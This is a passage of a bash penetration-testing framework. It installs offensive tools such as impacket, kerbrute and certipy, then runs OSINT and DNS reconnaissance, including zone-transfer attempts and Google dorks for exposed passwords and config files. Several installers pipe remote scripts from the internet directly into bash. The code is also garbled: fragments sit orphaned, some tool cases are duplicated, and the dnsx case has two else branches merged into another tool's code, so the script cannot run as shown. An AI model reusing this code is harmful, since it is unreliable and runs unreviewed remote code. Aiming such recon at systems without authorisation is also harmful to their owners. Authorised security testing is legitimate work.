                        _apt_install "feroxbuster" false || curl -sL --max-time 60 https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash &>/dev/null 2>&1 || true ;;

                    trufflehog)
                        _apt_install "trufflehog" false || curl -sL --max-time 60 "https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh" 2>/dev/null | bash -s -- --bin-dir /usr/local/bin &>/dev/null 2>&1 || true ;;
                            timeout 60 git clone --quiet --depth 1                                 "https://github.com/Tuhinshubhra/CMSeeK"                                 /opt/cmseek 2>/dev/null &&                             printf "#!/bin/bash\npython3 /opt/cmseek/cmseek.py \"\$@\"\n"                                 > /usr/local/bin/cmseek &&                             chmod +x /usr/local/bin/cmseek &&                             echo -e "  ${LGREEN}✓ cmseek installed from git${NC}" ||                             echo -e "  ${YELLOW}⚠ cmseek optional — CMS detection still uses WhatWeb${NC}"
                        fi ;;

                    certipy-ad)
                        if timeout 120 pip3 install certipy-ad --break-system-packages -q 2>/dev/null; then
                            printf "  \033[32m✓\033[0m installed via pip\n"
                        else
                            echo -e "${RED}failed — try: pip3 install certipy-ad${NC}"
                        fi ;;

                    ldapdomaindump)
                        if timeout 120 pip3 install ldapdomaindump --break-system-packages -q 2>/dev/null; then
                            printf "  \033[32m✓\033[0m installed via pip\n"
                        else
                            echo -e "${RED}failed — try: pip3 install ldapdomaindump${NC}"
                        fi ;;

                    impacket-GetUserSPNs|impacket-GetNPUsers)
                                                printf "  \033[2m[install]\033[0m impacket... "
                        local _io=false
                        DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq impacket-scripts &>/dev/null 2>&1 && _io=true
                        [[ "$_io" == false ]] && timeout 120 pip3 install impacket --break-system-packages -q 2>/dev/null && _io=true || true
                        printf "\033[32mdone\033[0m\n"
                        if [[ "$_io" == true ]]; then
                            for _sc in GetUserSPNs.py GetNPUsers.py secretsdump.py psexec.py; do
                                local _sf; _sf=$(find /usr /root ~/.local /opt 2>/dev/null -name "$_sc" -type f 2>/dev/null | head -1)
                                [[ -n "$_sf" ]] && ln -sf "$_sf" "/usr/local/bin/${_sc}" 2>/dev/null                                     && ln -sf "$_sf" "/usr/local/bin/${_sc%.py}" 2>/dev/null || true
                            done
                            echo -e "  ${LGREEN}✓ impacket + scripts in /usr/local/bin${NC}"
                        else
                            echo -e "  ${YELLOW}⚠ impacket optional — AD/Kerberos attacks need it${NC}"
                        fi ;;

                    sslyze)
                        if timeout 120 pip3 install sslyze --break-system-packages -q 2>/dev/null; then
                            printf "  \033[32m✓\033[0m installed via pip\n"
                        elif DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq python3-sslyze &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            printf "  \033[33m⚠\033[0m skipped\n"
                        fi ;;

                    arjun)
                        if timeout 120 pip3 install arjun --break-system-packages -q 2>/dev/null; then
                            printf "  \033[32m✓\033[0m installed via pip\n"
                        elif DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq arjun &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            printf "  \033[33m⚠\033[0m skipped\n"
                        fi ;;

                    commix)
                        if timeout 120 pip3 install commix --break-system-packages -q 2>/dev/null; then
                            printf "  \033[32m✓\033[0m installed via pip\n"
                        elif DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq commix &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            printf "  \033[33m⚠\033[0m skipped\n"
                        fi ;;

                    theharvester)
                        if timeout 120 pip3 install theharvester --break-system-packages -q 2>/dev/null; then
                            printf "  \033[32m✓\033[0m installed via pip\n"
                        elif DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq theharvester &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            printf "  \033[33m⚠\033[0m skipped\n"
                        fi ;;

                    # ── Go-installable tools (apt first, go install fallback) ────
                    nuclei)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq nuclei &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            _go_install nuclei "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest" || true
                        fi ;;


                    httpx)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq httpx-toolkit &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            _go_install httpx "github.com/projectdiscovery/httpx/cmd/httpx@latest" || true
                        fi ;;


                    subfinder)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq subfinder &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            _go_install subfinder "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest" || true
                        fi ;;


                    dnsx)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq dnsx &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            _go_install gau "github.com/lc/gau/v2/cmd/gau@latest" || true
                        fi ;;


                    waybackurls)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq waybackurls &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            _go_install waybackurls "github.com/tomnomnom/waybackurls@latest" || true
                        fi ;;


                    rustscan)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq rustscan &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            # Download prebuilt .deb from GitHub releases (much faster than cargo build)
                            local _rs_deb
                            _rs_deb=$(curl -s --max-time 15                                 "https://api.github.com/repos/RustScan/RustScan/releases/latest"                                 2>/dev/null | grep "browser_download_url.*amd64.deb"                                 | head -1 | cut -d'"' -f4 || echo "")
                            if [[ -n "$_rs_deb" ]]; then
                                curl -sL --max-time 60 "$_rs_deb" -o /tmp/rustscan.deb 2>/dev/null &&                                 DEBIAN_FRONTEND=noninteractive dpkg -i /tmp/rustscan.deb &>/dev/null 2>&1 &&                                 rm -f /tmp/rustscan.deb &&                                 echo -e "${LGREEN}binary done${NC}" ||                                 echo -e "${YELLOW}skipped — nmap covers port scanning${NC}"
                            else
                                echo -e "${YELLOW}skipped — nmap covers port scanning${NC}"
                            fi
                        fi ;;


                    dalfox)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq dalfox &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            _go_install dalfox "github.com/hahwul/dalfox/v2@latest" || true
                        fi ;;


                    feroxbuster)
                        DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq feroxbuster &>/dev/null 2>&1 \
                            && printf "  \033[32m✓\033[0m installed via apt\n" \
                            || { curl -sL --max-time 60 https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh \
                                | bash 2>/dev/null && printf "  \033[32m✓\033[0m done\n" \
                                || printf "  \033[33m⚠\033[0m skipped\n"; } ;;

                    # ── v5.0 new Go tools ────────────────────────────────────
                    trufflehog)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq trufflehog &>/dev/null 2>&1; then
                            echo -e "  ${LGREEN}✓ trufflehog installed${NC}"
                        else
                            # Use official install script (prebuilt binary — go build fails without CGO deps)
                                                        printf "  \033[2m[fetch]\033[0m trufflehog... "
                            local _tf_installed=false
                            curl -sL --max-time 60                                 "https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh"                                 2>/dev/null | bash -s -- --bin-dir /usr/local/bin &>/dev/null 2>&1                                 && _tf_installed=true
                            printf "\033[32mdone\033[0m\n"
                            if [[ "$_tf_installed" == true ]] && command -v trufflehog &>/dev/null; then
                                echo -e "  ${LGREEN}✓ trufflehog installed${NC}"
                            else
                                echo -e "  ${YELLOW}⚠ trufflehog optional — git secret scanning skipped${NC}"
                            fi
                        fi ;;


                    hakrawler)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq hakrawler &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            _go_install hakrawler "github.com/hakluke/hakrawler@latest" || true
                        fi ;;


                    gf)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq gf &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            { _go_install gf "github.com/tomnomnom/gf@latest" || true
                            # Install gf patterns repo
                            if [[ -n "$GOPATH_BIN" ]] && command -v gf &>/dev/null; then
                            local gf_dir; gf_dir="${HOME}/.gf"
                            mkdir -p "$gf_dir"
                            timeout 60 git clone --quiet --depth 1 \
                                "https://github.com/1ndianl33t/Gf-Patterns" \
                                "${gf_dir}/Gf-Patterns" 2>/dev/null || true
                            if [[ -d "${gf_dir}/Gf-Patterns" ]]; then
                                cp "${gf_dir}/Gf-Patterns/"*.json "$gf_dir/" 2>/dev/null || true
                            fi
                            log_ok "gf patterns installed to ${gf_dir}"
                            fi; }
                        fi ;;


                    notify)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq notify &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            _go_install notify "github.com/projectdiscovery/notify/cmd/notify@latest" || true
                        fi ;;


                    interactsh-client)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq interactsh-client &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            _go_install interactsh-client \
                                "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest" || true
                        fi ;;


                    anew)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq anew &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            _go_install anew "github.com/tomnomnom/anew@latest" || true
                        fi ;;


                    parallel)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq parallel &>/dev/null 2>&1; then
                            # Silence the "will cite" nag that hangs scripts
                            mkdir -p ~/.parallel 2>/dev/null
                            touch ~/.parallel/will-cite 2>/dev/null
                            printf "  \033[32m✓\033[0m done\n"
                        else
                            echo -e "${YELLOW}optional — tasks will run sequentially${NC}"
                        fi ;;

                    kerbrute)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq kerbrute &>/dev/null 2>&1; then
                            echo -e "  ${LGREEN}✓ kerbrute installed${NC}"
                        else
                            # Download prebuilt binary from GitHub
                            local _arch; _arch=$(uname -m)
                            [[ "$_arch" == "x86_64" ]] && _arch="amd64"
                            [[ "$_arch" == "aarch64" ]] && _arch="arm64"
                            local _kb_url
                            _kb_url=$(curl -s --max-time 10                                 "https://api.github.com/repos/ropnop/kerbrute/releases/latest"                                 2>/dev/null | grep "browser_download_url.*linux_${_arch}"                                 | head -1 | cut -d'"' -f4 || echo "")
                            if [[ -n "$_kb_url" ]]; then
                                                                printf "  \033[2m[fetch]\033[0m kerbrute binary... "
                                curl -sL --max-time 60 "$_kb_url" -o /usr/local/bin/kerbrute 2>/dev/null &&                                 chmod +x /usr/local/bin/kerbrute 2>/dev/null &&                                 _spinner_stop && echo -e "  ${LGREEN}✓ kerbrute binary installed${NC}" ||                                 { _spinner_stop; echo -e "  ${YELLOW}⚠ kerbrute optional — Kerberos attacks need it${NC}"; }
                            else
                                echo -e "  ${YELLOW}⚠ kerbrute optional — install: apt install kerbrute${NC}"
                            fi
                        fi ;;

                    joomscan)
                        if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq joomscan &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            # Install from OWASP GitHub (Perl script — just clone and symlink)
                            if command -v perl &>/dev/null; then
                                timeout 60 git clone --quiet --depth 1                                     "https://github.com/OWASP/joomscan"                                     /opt/joomscan 2>/dev/null &&                                 ln -sf /opt/joomscan/joomscan.pl /usr/local/bin/joomscan 2>/dev/null &&                                 chmod +x /opt/joomscan/joomscan.pl 2>/dev/null &&                                 echo -e "${LGREEN}git done${NC}" ||                                 echo -e "${YELLOW}optional — skipping Joomla scanner${NC}"
                            else
                                echo -e "${YELLOW}optional — skipping Joomla scanner${NC}"
                            fi
                        fi ;;

                    sublist3r)
                        if { timeout 90 pip3 install sublist3r --break-system-packages -q 2>/dev/null; };  then
                            printf "  \033[32m✓\033[0m installed via pip\n"
                        elif DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq sublist3r &>/dev/null 2>&1; then
                            printf "  \033[32m✓\033[0m installed via apt\n"
                        else
                            echo -e "${YELLOW}optional — subfinder/amass will handle subdomain enum${NC}"
                        fi ;;

                    wkhtmltopdf)
                                                printf "  \033[2m[install]\033[0m wkhtmltopdf... "
                        local _wk_ok=false
                        # Try apt with both possible package names
                        DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq wkhtmltopdf &>/dev/null 2>&1 && _wk_ok=true
                        [[ "$_wk_ok" == false ]] &&                             DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq wkhtmltox &>/dev/null 2>&1 && _wk_ok=true || true
                        # Download prebuilt .deb if apt fails
                        if [[ "$_wk_ok" == false ]]; then
                            curl -sL --max-time 120                                 "https://github.com/wkhtmltopdf/packaging/releases/download/0.12.6.1-3/wkhtmltox_0.12.6.1-3.bookworm_amd64.deb"                                 -o /tmp/wkhtmltox.deb 2>/dev/null                             && DEBIAN_FRONTEND=noninteractive dpkg -i /tmp/wkhtmltox.deb &>/dev/null 2>&1                             && rm -f /tmp/wkhtmltox.deb && _wk_ok=true || true
                        fi
                        # Symlink in case installed to non-standard path
                        local _wkb; _wkb=$(find /usr /opt 2>/dev/null -name "wkhtmltopdf" -type f 2>/dev/null | head -1)
                        [[ -n "$_wkb" ]] && ln -sf "$_wkb" /usr/local/bin/wkhtmltopdf 2>/dev/null || true
                        printf "\033[32mdone\033[0m\n"
                        if command -v wkhtmltopdf &>/dev/null; then
                            echo -e "  ${LGREEN}✓ wkhtmltopdf installed — PDF reports enabled${NC}"
                        else
                            echo -e "  ${YELLOW}⚠ wkhtmltopdf optional — HTML report still works${NC}"
                            DEBIAN_FRONTEND=noninteractive apt-get install -y -qq xvfb libfontconfig1 &>/dev/null 2>&1 || true
                        fi ;;

                    *)
                        # Final fallback: try apt
                        DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq "$pkg" &>/dev/null 2>&1 \
                            && printf "  \033[32m✓\033[0m done\n" \
                            || echo -e "${RED}failed — skipping${NC}" ;;
                esac
            done

            # ── Verify installs and warn on still-missing tools ───────────────
            echo ""
            # Refresh PATH so newly installed tools are found
            export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:${GOPATH_BIN:-/root/go/bin}:${PATH}"
            hash -r 2>/dev/null || true
            log_section "Post-install verification..."
            local still_missing=()
            for pkg in "${MISSING[@]}"; do
                local chk="$pkg"
                case "$pkg" in
                    dnsutils) chk="dig" ;; netcat-openbsd) chk="nc" ;;
                    python3-pip) chk="pip3" ;; impacket-scripts) chk="impacket-samrdump" ;;
                    impacket-GetUserSPNs) chk="GetUserSPNs.py" ;;
                    impacket-GetNPUsers)  chk="GetNPUsers.py"  ;;
                    certipy-ad) command -v certipy &>/dev/null && chk="certipy" || { command -v certipy-ad &>/dev/null && chk="certipy-ad" || chk="certipy"; } ;;
                    httpx) chk="httpx" ;;
                esac
                if command -v "$chk" &>/dev/null; then
                    printf "    ${LGREEN}✓${NC}  %-28s now installed\n" "$chk"
                else
                    still_missing+=("$pkg")
                    printf "    ${RED}✗${NC}  %-28s still missing\n" "$pkg"
                fi
            done
            if [[ ${#still_missing[@]} -gt 0 ]]; then
                log_warn "${#still_missing[@]} tool(s) could not be installed automatically: ${still_missing[*]}"
                log_info "These will be skipped gracefully during scanning. Re-run as root with internet access."
            else
                log_ok "All missing tools successfully installed."
            fi
        else
            log_warn "Not running as root — cannot auto-install missing tools."
            log_warn "Re-run with: sudo bash ${BASH_SOURCE[0]}"
            log_warn "Missing tools will be skipped during scanning."
        fi
    fi

    # ── crackmapexec / netexec alias resolution (used throughout all phases) ──
    # BUG FIX: modern Kali replaced crackmapexec with netexec (nxc); resolve alias once globally
    if ! command -v crackmapexec &>/dev/null; then
        if command -v nxc &>/dev/null; then
            crackmapexec() { nxc "$@"; }
            export -f crackmapexec 2>/dev/null || true
            log_info "crackmapexec aliased to nxc (NetExec)"
        elif command -v cme &>/dev/null; then
            crackmapexec() { cme "$@"; }
            export -f crackmapexec 2>/dev/null || true
            log_info "crackmapexec aliased to cme"
        fi
    fi

    # ── v5.0 feature flag resolution ──────────────────────────────────────────
    command -v jq              &>/dev/null && JQ_AVAILABLE=true    && log_ok "jq available — structured JSON parsing enabled"
    command -v anew            &>/dev/null && ANEW_AVAILABLE=true  && log_ok "anew available — dedup pipelines enabled"
    command -v notify          &>/dev/null && NOTIFY_PER_FINDING=true && log_ok "notify available — per-finding push enabled"
    if command -v parallel     &>/dev/null; then
        mkdir -p ~/.parallel 2>/dev/null; touch ~/.parallel/will-cite 2>/dev/null
        PARALLEL_JOBS=$(( $(nproc 2>/dev/null || echo 2) / 2 ))
        [[ ${PARALLEL_JOBS:-0} -lt 1 ]] && PARALLEL_JOBS=1
        log_ok "GNU parallel available — parallel jobs: ${PARALLEL_JOBS}"
    fi
    # Start interactsh-client in background for OOB detection (phases 28, 20, 19)
    if command -v interactsh-client &>/dev/null; then
        interactsh-client -json -o "${OUTPUT_DIR}/raw_logs/interactsh.json" \
            2>/dev/null &
        INTERACTSH_PID=$!
        # Poll for URL (max 8s) — never block more than 8 seconds
        local ict_waited=0
        while [[ ${ict_waited:-0} -lt 8 ]]; do
            sleep 1
            ict_waited=$(( ict_waited + 1 ))
            INTERACTSH_URL=$(head -1 "${OUTPUT_DIR}/raw_logs/interactsh.json" 2>/dev/null \
                | grep -oE '"url"[[:space:]]*:[[:space:]]*"[^"]+"' | grep -oE '"[^"]+"$' | tr -d '"' || echo "")
            [[ -n "$INTERACTSH_URL" ]] && break
        done
        if [[ -n "$INTERACTSH_URL" ]]; then
            log_ok "interactsh-client running — OOB URL: ${INTERACTSH_URL}"
        else
            log_warn "interactsh-client did not start within 8s — OOB detection disabled"
            kill "$INTERACTSH_PID" 2>/dev/null || true
            INTERACTSH_PID=0
        fi
    fi

    # ── [HARDENED] Core Dependency Verification (Existence Proof) ──────────────
    local -a CORE_BINS=("nmap" "nuclei" "httpx" "python3" "jq")
    local _missing_core=0
    for b in "${CORE_BINS[@]}"; do
        if ! command -v "$b" &>/dev/null; then
            log_error "CRITICAL CORE TOOL MISSING: ${b}"
            _missing_core=$(( _missing_core + 1 ))
        fi
    done

    # Verify Internal Engines (Deterministic Behavioral Guard)
    for eng in "nmap_parser.py" "web_parser.py" "preflight.sh"; do
        if [[ ! -f "${SCRIPT_DIR}/${eng}" ]]; then
            log_error "INTERNAL ENGINE MISSING: ${eng} (must be in script directory)"
            _missing_core=$(( _missing_core + 1 ))
        fi
    done

    if [[ $_missing_core -gt 0 ]]; then
        echo ""
        log_warn "FRAMEWORK DEGRADED: ${_missing_core} critical components are missing."
        echo -e "  ${RED}The Aristotelian Hardening prevents the framework from running in a 'blind' state.${NC}"
        echo -e "  ${CYAN}Please verify your installation or check your network connectivity.${NC}"
        echo -e "  ${YELLOW}Tip: run 'bash qa_harness.sh' to diagnose issues.${NC}"
        echo ""
    fi

    log_ok "Phase 0 Complete. Environment verified."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — PASSIVE OSINT RECONNAISSANCE
# ════════════════════════════════════════════════════════════════════════════════
phase_osint() {
    log_phase 1 "${PHASE_NAMES[1]}"

    # WHOIS
    if command -v whois &>/dev/null; then
        run_tool_timeout "whois" "${OUTPUT_DIR}/whois/whois.txt" 30 \
            whois "$TARGET" 2>/dev/null || true
        local f="${OUTPUT_DIR}/whois/whois.txt"
        if [[ -f "$f" ]]; then
            grep -iE "registrant|admin|tech|email|phone|org|name" "$f" | head -20 \
                >> "${OUTPUT_DIR}/whois/contacts.txt" 2>/dev/null || true
            # Check if real email exposed (not RDDS privacy message)
            local _whois_real; _whois_real=$(grep -iE "registrant.*email|admin.*email" "$f" 2>/dev/null \
                | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}" \
                | grep -viE "redacted|privacy|please.query|whoisprotect" | head -1 || echo "")
            if [[ -n "$_whois_real" ]]; then
                add_vuln "LOW" "WHOIS Registrant Email Exposed" \
                    "Domain WHOIS data exposes contact email addresses that can be used for spear-phishing or social engineering." \
                    "Use domain privacy/WHOIS protection service to redact personal data." \
                    "$(grep -iE 'registrant email|admin email' "$f" | head -3)"
            fi
        fi
    fi

    # theHarvester — email/domain intel
    if command -v theHarvester &>/dev/null || command -v theharvester &>/dev/null; then
        local harv_bin; harv_bin=$(command -v theHarvester 2>/dev/null || command -v theharvester 2>/dev/null)
        run_tool_timeout "theHarvester" "${OUTPUT_DIR}/theharvester/results.txt" 120 \
            "$harv_bin" -d "$TARGET" -b google,bing,certspotter,hackertarget,urlscan -l 200 2>/dev/null || true
        local hf="${OUTPUT_DIR}/theharvester/results.txt"
        if [[ -f "$hf" ]]; then
            # Filter out tool-internal emails; only keep emails from target domain
            local _real_emails; _real_emails=$(grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}" \
                "$hf" 2>/dev/null \
                | grep -viE "edge-security\\.com|laramies@|cmartorella@|shodan\\.io|example\\.com" \
                | sort -u | head -10 || echo "")
            local email_count; email_count=$(echo "$_real_emails" | grep -c "@" 2>/dev/null || true)
            email_count=$(( ${email_count:-0} ))
            if [[ ${email_count:-0} -gt 0 ]]; then
                local emails_ev; emails_ev=$(echo "$_real_emails" | head -5 | tr "\n" " ")
                add_vuln "LOW" "Email Addresses Harvested (${email_count} found)" \
                    "Publicly indexed email addresses can be used for phishing and credential stuffing." \
                    "Implement email harvesting protection. Train staff on phishing awareness." \
                    "$emails_ev"
            fi
        fi
    fi

    # Certificate Transparency logs (crt.sh)
    if command -v curl &>/dev/null; then
        log_info "Querying crt.sh certificate transparency..."
        run_tool_timeout "crt.sh" "${OUTPUT_DIR}/theharvester/crtsh.json" 30 \
            curl -s "https://crt.sh/?q=%.${TARGET}&output=json" --max-time 25 2>/dev/null || true
        local crtf="${OUTPUT_DIR}/theharvester/crtsh.json"
        if [[ -f "$crtf" ]] && [[ -s "$crtf" ]] && head -1 "$crtf" 2>/dev/null | grep -q '\['; then
            # Validate JSON array before parsing (crt.sh returns HTML on error/rate-limit)
            grep -oE '"name_value":"[^"]+"' "$crtf" 2>/dev/null | cut -d'"' -f4 \
                | sort -u > "${OUTPUT_DIR}/subdomains/from_crtsh.txt" 2>/dev/null || true
            local crt_count; crt_count=$(( $(wc -l < "${OUTPUT_DIR}/subdomains/from_crtsh.txt" 2>/dev/null || echo 0) + 0 ))
            log_ok "crt.sh: ${crt_count} subdomains from certificate transparency"
        fi
    fi

    # Shodan check (if shodan CLI available)
    if command -v shodan &>/dev/null; then
        run_tool_timeout "shodan" "${OUTPUT_DIR}/shodan/result.txt" 30 \
            shodan host "$TARGET" 2>/dev/null || true
    fi

    # Google dork hints (passive — no active requests)
    {
        echo "# OSINT Google Dork Suggestions for: $TARGET"
        echo "site:${TARGET}"
        echo "site:${TARGET} filetype:pdf"
        echo "site:${TARGET} filetype:xls OR filetype:xlsx OR filetype:doc"
        echo "site:${TARGET} inurl:login OR inurl:admin OR inurl:panel"
        echo "site:${TARGET} intitle:\"index of\""
        echo "site:${TARGET} ext:sql OR ext:bak OR ext:conf OR ext:env"
        echo "\"@${TARGET}\" email"
        echo "inurl:${TARGET} password OR passwd OR secret"
    } > "${OUTPUT_DIR}/theharvester/google_dorks.txt"
    log_ok "Google dork suggestions saved"

    log_ok "Phase 1 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — DNS ENUMERATION & ZONE TRANSFER
# ════════════════════════════════════════════════════════════════════════════════
phase_dns() {
    log_phase 2 "${PHASE_NAMES[2]}"
    local dns_dir="${OUTPUT_DIR}/dns"

    # Basic DNS records — run directly (fast, no spinner needed)
    if command -v dig &>/dev/null; then
        log_info "Querying DNS records for ${TARGET}..."
        for rec in A AAAA MX NS TXT SOA CNAME SRV; do
            timeout 8 dig "$TARGET" "$rec" +short +timeout=5                 > "${dns_dir}/dig_${rec}.txt" 2>/dev/null || true
        done
        log_ok "DNS records collected"

        # SPF check
        local txt_out="${dns_dir}/dig_TXT.txt"
        if [[ -f "$txt_out" ]]; then
            if ! grep -qi "v=spf1" "$txt_out" 2>/dev/null; then
                add_vuln "MEDIUM" "Missing SPF DNS Record" \
                    "No SPF record found. Attackers can spoof emails from this domain, facilitating phishing." \
                    "Add a valid SPF TXT record: v=spf1 mx -all" \
                    "dig ${TARGET} TXT — no SPF record found"
            else
                log_ok "SPF record present"
            fi
        fi

        # DMARC check (independent — queries _dmarc subdomain, not TXT)
        timeout 8 dig "_dmarc.${TARGET}" TXT +short +timeout=5             > "${dns_dir}/dig_dmarc.txt" 2>/dev/null || true
        if [[ -f "${dns_dir}/dig_dmarc.txt" ]]; then
            if grep -qi "v=DMARC1" "${dns_dir}/dig_dmarc.txt" 2>/dev/null; then
                log_ok "DMARC record present"
            else
                add_vuln "MEDIUM" "Missing DMARC DNS Record" \
                    "No DMARC policy configured. Phishing and email spoofing attacks are easier without DMARC." \
                    "Add: _dmarc.${TARGET} IN TXT \"v=DMARC1; p=reject; rua=mailto:dmarc@${TARGET}\"" \
                    "dig _dmarc.${TARGET} TXT — no DMARC record"
            fi
        fi

        # DKIM check — run all selector lookups quietly in parallel
        local dkim_found=false
        for sel in default dkim google mail selector1 selector2 k1; do
            timeout 6 dig "${sel}._domainkey.${TARGET}" TXT +short +timeout=5                 > "${dns_dir}/dkim_${sel}.txt" 2>/dev/null &
        done
        wait 2>/dev/null  # wait for all background digs
        # Check results
        for sel in default dkim google mail selector1 selector2 k1; do
            if grep -qi "v=DKIM1" "${dns_dir}/dkim_${sel}.txt" 2>/dev/null; then
                log_ok "DKIM record found (selector: ${sel})"
                dkim_found=true
                break
            fi
        done
        [[ "$dkim_found" == false ]] && log_info "No DKIM record found (checked common selectors)"

        # Zone transfer attempt
        local ns_list
        ns_list=$(timeout 10 dig "$TARGET" NS +short 2>/dev/null | head -5)
        if [[ -n "$ns_list" ]]; then
            # Skip AXFR against known public DNS providers — they always refuse it
            local _axfr_tried=0
            while IFS= read -r ns; do
                ns="${ns%.}"   # strip trailing dot
                [[ -z "$ns" ]] && continue
                # Skip well-known public resolvers that never allow AXFR
                echo "$ns" | grep -qiE                     "domaincontrol\.com|cloudflare\.com|googledomains\.com|awsdns|azure-dns|ultradns|dynect|ns1\.com|namebrightdns|registrar-servers|name-services\.com|parkingcrew|bodis|sedoparking|dnsimple|dreamhost|hover\.com|namecheap"                     && continue
                _axfr_tried=$(( _axfr_tried + 1 ))
                log_info "Trying zone transfer: @${ns}"
                run_tool_timeout "zone-transfer" "${dns_dir}/axfr_${ns}.txt" 10                     dig "@${ns}" "$TARGET" AXFR +noall +answer || true
                # Only flag real DNS records returned
                if grep -qE "IN[[:space:]]+(A|AAAA|MX|NS|CNAME|TXT|SOA)"                     "${dns_dir}/axfr_${ns}.txt" 2>/dev/null; then
                    add_vuln "CRITICAL" "DNS Zone Transfer Allowed (AXFR)"                         "NS server ${ns} allows full zone transfer. Attacker can enumerate entire DNS zone including internal hosts."                         "Restrict AXFR to authorized secondary name servers only."                         "dig @${ns} ${TARGET} AXFR — zone data leaked"
                fi
            done <<< "$ns_list"
            [[ ${_axfr_tried:-0} -eq 0 ]] && log_info "Zone transfer skipped — all NS servers are managed DNS providers"
        fi
    fi

    # dnsenum (comprehensive DNS enum)
    if command -v dnsenum &>/dev/null; then
        run_tool_timeout "dnsenum" "${dns_dir}/dnsenum.txt" 120 \
            dnsenum --noreverse --nocolor "$TARGET" 2>/dev/null || true
    fi

    # Reverse DNS
    if [[ "$TARGET_TYPE" == "IP" ]] && command -v dig &>/dev/null; then
        run_tool_timeout "reverse-dns" "${dns_dir}/rdns.txt" 15 \
            dig -x "$TARGET" +short 2>/dev/null || true
    fi

    log_ok "Phase 2 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — SUBDOMAIN ENUMERATION (DEEP)
# ════════════════════════════════════════════════════════════════════════════════
phase_subdomains() {
    log_phase 3 "${PHASE_NAMES[3]}"
    local sub_dir="${OUTPUT_DIR}/subdomains"

    if [[ "$TARGET_TYPE" != "DOMAIN" ]]; then
        log_info "Target is IP -- skipping subdomain enumeration"
        PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
        return 0
    fi

    # MANDATE 3: Triple-UUID Wildcard DNS Check
    WILDCARD_DNS=false
    local _wc_count=0
    log_section "Wildcard DNS detection (3-probe check)..."
    for _i in 1 2 3; do
        local _wc_uuid; _wc_uuid="acromap${RANDOM}${RANDOM}${_i}"
        local _wc_ip; _wc_ip=$(dig +short "${_wc_uuid}.${TARGET}" A 2>/dev/null | grep -oE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1 || echo "")
